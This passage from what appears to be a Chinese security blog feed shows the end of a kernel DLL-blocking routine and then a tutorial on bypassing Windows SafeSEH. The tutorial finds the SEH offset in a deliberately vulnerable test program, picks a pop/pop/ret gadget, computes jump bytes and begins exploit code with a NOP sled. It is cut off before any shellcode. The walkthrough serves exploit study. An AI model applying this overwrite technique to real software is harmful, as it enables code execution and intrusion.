class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> IsOk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从VirtualAddress查找第一次出现KEY_NAME的位置，返回到v1</span></span><br><span class="line">        <span class="comment">// 检查文件头</span></span><br><span class="line">        v1 = <span class="built_in">strstr</span>(VirtualAddress, KEY_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到文件开始位置</span></span><br><span class="line">        v1 = <span class="built_in">strstr</span>(v1, SUB_KEY_COUNT_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移动指针到内容</span></span><br><span class="line">        v1 += <span class="built_in">strlen</span>(SUB_KEY_COUNT_NAME);</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指针v2指向第一个分号</span></span><br><span class="line">        v2 = <span class="built_in">strstr</span>(v1, SEPARATE_NAME);  </span><br><span class="line">        <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(Key, <span class="built_in">sizeof</span>(Key));</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(KeyValue, <span class="built_in">sizeof</span>(KeyValue));</span><br><span class="line">        <span class="comment">// 按照规则创建一个格式化的字符串 %d</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchPrintfA</span>(</span><br><span class="line">            Key,</span><br><span class="line">            <span class="number">32</span>,</span><br><span class="line">            <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">            DLL_MAX_COUNT</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Count = 100,120</span></span><br><span class="line">        <span class="keyword">if</span> ((v2 &lt;= v1) ||</span><br><span class="line">            (v2 - v1 &gt; (<span class="type">int</span>)<span class="built_in">strlen</span>(Key)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 指针位置不对</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将v1、v2之间的内容拷贝到KeyValue中，转换成UnicodeString</span></span><br><span class="line">        <span class="built_in">RtlCopyMemory</span>(KeyValue, v1, v2 - v1);</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>(&amp;v3, KeyValue);</span><br><span class="line">        Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(</span><br><span class="line">            &amp;v4,</span><br><span class="line">            &amp;v3,</span><br><span class="line">            TRUE     <span class="comment">//动态申请内存</span></span><br><span class="line">        );  <span class="comment">//单字转换成双字</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换成Int</span></span><br><span class="line">        Status = <span class="built_in">RtlUnicodeStringToInteger</span>(</span><br><span class="line">            &amp;v4,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            (PULONG)&amp;Count</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Count中是dll的总数</span></span><br><span class="line">        <span class="built_in">RtlFreeUnicodeString</span>(&amp;v4);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((Count &lt; <span class="number">0</span>) ||</span><br><span class="line">            (Count &gt; DLL_MAX_COUNT))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 先释放之前的结构</span></span><br><span class="line">        <span class="keyword">if</span> (__AntiLoadDll != <span class="literal">NULL</span>)   <span class="comment">//二维指针  [int]【】【】【】【】【】【】</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeBuffer</span>((PVOID)__AntiLoadDll);</span><br><span class="line">            __AntiLoadDll = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ViewSize = Count * <span class="built_in">sizeof</span>(ANTI_LOAD_DLL_ENTRY) + <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">        __AntiLoadDll = (PANTI_LOAD_DLL)<span class="built_in">AllocateBuffer</span>(ViewSize);</span><br><span class="line">        <span class="keyword">if</span> (__AntiLoadDll == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(__AntiLoadDll, ViewSize);</span><br><span class="line"></span><br><span class="line">        __AntiLoadDll-&gt;Count = Count;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// 遍历所有数量</span></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(Key, <span class="built_in">sizeof</span>(Key));</span><br><span class="line">            <span class="comment">// key变为“i=”格式</span></span><br><span class="line">            Status = <span class="built_in">RtlStringCchPrintfA</span>(</span><br><span class="line">                Key,</span><br><span class="line">                <span class="number">32</span>,</span><br><span class="line">                <span class="string">&quot;%d=&quot;</span>,</span><br><span class="line">                i + <span class="number">1</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Key[32]  &quot;1=&quot; </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//Count=100,     1= 查找位置</span></span><br><span class="line">            v2 = <span class="built_in">strstr</span>(v1, Key);</span><br><span class="line">            <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">// 移动指针，查找分号位置</span></span><br><span class="line">            v1 = v2;</span><br><span class="line">            v2 = <span class="built_in">strstr</span>(v1, SEPARATE_NAME);</span><br><span class="line">            <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">// 移动指针过key</span></span><br><span class="line">            v1 += <span class="built_in">strlen</span>(Key);</span><br><span class="line">            <span class="comment">// 验证指针不超过;</span></span><br><span class="line">            <span class="keyword">if</span> ((v2 &lt;= v1) ||</span><br><span class="line">                (v2 - v1 &gt;= DLL_HASH_COUNT))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// 取出等号后的KeyValue</span></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(KeyValue, <span class="built_in">sizeof</span>(KeyValue));</span><br><span class="line">            <span class="built_in">RtlCopyMemory</span>(KeyValue, v1, v2 - v1);</span><br><span class="line">            <span class="built_in">RtlInitAnsiString</span>(&amp;v3, KeyValue);</span><br><span class="line">            Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(</span><br><span class="line">                &amp;v4,</span><br><span class="line">                &amp;v3,</span><br><span class="line">                TRUE</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// KeyValue即是文件hash，取到结构中</span></span><br><span class="line">            PathHash = <span class="number">0</span>;</span><br><span class="line">            Status = <span class="built_in">RtlUnicodeStringToInteger</span>(</span><br><span class="line">                &amp;v4,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                &amp;PathHash</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">RtlFreeUnicodeString</span>(&amp;v4);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status) || (PathHash &lt;= <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __AntiLoadDll-&gt;Entry[i].PathHash = PathHash;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IsOk = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内核拦截DLL&quot;&gt;&lt;a href=&quot;#内核拦截DLL&quot; class=&quot;headerlink&quot; title=&quot;内核拦截DLL&quot;&gt;&lt;/a&gt;内核拦截DLL&lt;/h1&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>突破SafeSEH</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/</id>
    <published>2024-03-09T12:37:05.000Z</published>
    <updated>2024-03-09T12:37:46.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="突破safeSeh"><a href="#突破safeSeh" class="headerlink" title="突破safeSeh"></a>突破safeSeh</h1><p>设计SafeSEH保护机制的目的，以为了防止那种攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击。自Windwos XP SP2之后，微软就已经引入了SafeSEH技术。不过由于SafeSEH需要编译器在编译PE文件时进行特殊支持才能发挥作用，而xp sp2下的系统文件基本都是不支持SafeSEH的编译器编译的，因此在xpsp2下，SafeSEH还没有发挥作用（VS2003及更高版本的编译器中已经开始支持）。从Vista开始，由于系统PE文件基本都是由支持SafeSEH的编译器编译的，因此从Vista开始，SafeSEH开始发挥他强大的作用，对于以前那种简单的通过覆盖异常处理句柄的漏洞利用技术，也就基本失效了。</p><p>SafeSEH的基本原理很简单，即在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠（被覆盖了，被篡改了），立即终止异常处理函数的调用</p><p>对于目前的大部分windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用，比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。如图</p><p><img src="/.io//image-20240212235650863.png" alt="image-20240212235650863"></p><p>由上图可以看到test1.exe未受到SafeSeh保护。</p><ol><li>在Exploit 中不利用 SEH（而是通过覆盖返回地址的方法来利用，前提是模块没有GS保护）</li><li>如果程序编译的时候没有启用 safeseh 并且至少存在一个没启用 safeseh 的加载模块（系统模块或程序 私有模块）。这样就可以用这些模块中的 pop&#x2F;pop&#x2F;ret 指令地址来绕过保护。test1.exe程序没有启用SafeSeh，所以我们仍然可以利用这两个模块的指令地址绕过SafeSeh。</li><li>如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，应用程序被加载 的地址有 NULL 字节，如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址（NULL 字节会是最后 一个字节），但是你不能把 shellcode 放在异常处理器之后（因为这样 shellcode 将不会被拷贝到内存中 – NULL 是字符串终止符）</li></ol><p><strong>实战当只有应用程序本身没有开启SafeSeh时如何绕过SafeSeh技术</strong></p><p>原理：如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，尽管应用程序被加载的地址有 NULL 字节【应用程序加载的地址一般是0x00开头】，但如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址覆盖SE Handler（NULL 字节会是最后 一个字节）。我们可以把shellcode放到Pointer to next SEH record的前面，在Pointer to next SEH record加一个跳到shellcode的跳转，所以我们可以直接忽视0x00截断问题。</p><p>当所有系统的模块都开启了SafeSeh，而我们又不得不利用SafeSeh时，我们希望程序本身没有没有SafeSeh，幸运的是，这种情况非常常见。为了方便演示这种技术，使用下面的代码：</p><p>关闭DEP，SafeSeh选项</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> temp[<span class="number">2048</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test</span>(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面计算多少字符能够覆盖到默认SEH 。用Immunity Debugger产生10000个随机字符序列：</p><p><img src="/.io//image-20240213000454902.png" alt="image-20240213000454902"></p><p>找到这个pattern.txt，用这个10000个字符替换test(“AAAA”); 中AAAA。然后重新编译。</p><p>用Windbg载入，执行两次 g，然后 !exchain。如图</p><p><img src="/.io//image-20240213000403059.png" alt="image-20240213000403059"></p><p>!exchain查询异常信息，可以看到，nseh【注：下文提到的nseh为Pointer to next SEH record，n是next的意思。Nseh是指向下一个异常处理结构的指针，seh是异常处理函数的指针。】已经被覆盖为0x62443961(bD9a)，回到Immunity Debugger，执行!mona po bD9a。</p><p><img src="/.io//image-20240213000444080.png" alt="image-20240213000444080"></p><p> 2368字节可以覆盖到nseh。我们可以验证一下，改为test(“AAAAAAAAAAAAAAAAA……”);  里面是2368个A。重新编译，用Immunity Debugger载入，直接运行</p><p><img src="/.io//image-20240213000622376.png" alt="image-20240213000622376"></p><p>刚好能覆盖到nseh。下面就是在应用程序的模块找pop pop retn序列地址。我们不能在系统dll模块找，因为它们有SafeSeh保护，将导致我们的shellcode执行失败。 我用Immunity Debugger的搜索功能 r32是模糊匹配32位寄存器。</p><p>为什么要找这样一个地址？<a href="https://blog.csdn.net/youb11/article/details/45113011">为什么POP&#x2F;POP&#x2F;RET是必需的_pop ret-CSDN博客</a></p><p><a href="https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/">https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/</a></p><p><img src="/.io//image-20240213001131067.png" alt="image-20240213001131067"></p><p>幸运的是pop pop retn这种指令很多，很快，在0x00401231找到了一个</p><p>   00401231  . 59       POP ECX</p><p>   00401232  . 59       POP ECX</p><p>   00401233  . C3       RETN</p><p>   下面就是构造溢出字符串：</p><p>   buf + nseh + Nseh + nops + shellcode,其中Next SEH：放置Shellcode地址  SEH handle：放置“POP POP RET”操作函数的地址</p><p>pop pop retn指令地址0x00401231有截断字符\00。会导致后面的shellcode被截断。我们得想办法解决：那么把shellcode放前面，在seh后面加一个跳转跳到我们的shellcode？你也许觉得可以。其实，这不行，因为seh后面都被截断了，无法在seh后面放跳转指令跳到shellcode。但是，注意到程序在执行pop pop retn后会跟踪执行nseh指令，而nseh在seh前面，不会被截断。因此我们可以在nseh跳到shellcode。把shellcode布置到nseh前面的buf中。由前面我们知道，2368个字符可以覆盖到nseh，我们在其中放置shellcode，不足的用\x90填充。我看了下我们shellcode长度是194字节，所以我们可以把shellcode布置在nseh前的194字节处，shellcode前面用\x90填充。那么nseh这里应该是跳到前面的shellcode的指令</p><p>我们可以用Immunity Debugger。转到nseh所在地址0x0018FF78。按空格键，在这一行反汇编：jmp 0x0018FEB8 (shellcode地址)</p><p>然而我发现这不行，我们nseh只能放四个字节长的指令，jmp 0x0018FEB8指令五字节。但我们还有解决的办法：把shellcode在往上移动八个字节，在nseh前面就空出了八个字节，在这里放置跳转到shellcode的地址，nseh放置跳转到那八个字节。继续，shellcode往上移动八个字节就到了0x0018FEB0处，nseh跳到它前面的把个字节0x0018FF70处。</p><p>所以nseh应该放置0x9090F6EB，用同样的办法</p><p>Nseh前面的八个字节应该放0x909090FFFFFF39E9。构造的Exploit如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">          <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="type">char</span> temp[<span class="number">2048</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>(<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9